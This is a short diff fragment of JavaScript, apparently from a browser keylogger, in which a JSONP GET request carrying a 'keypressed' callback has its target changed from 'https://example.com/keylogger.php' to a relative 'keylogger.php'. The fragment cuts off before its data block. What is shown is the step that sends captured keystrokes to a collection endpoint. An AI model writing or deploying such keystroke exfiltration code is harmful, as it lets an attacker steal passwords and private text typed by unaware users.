@@ -16,7 +16,7 @@ function c(d)
     {
         dataType: "jsonp",
         type:"GET",
-        url: "https://example.com/keylogger.php",
+        url: "keylogger.php",
         jsonp:"keypressed",
         data:
         {
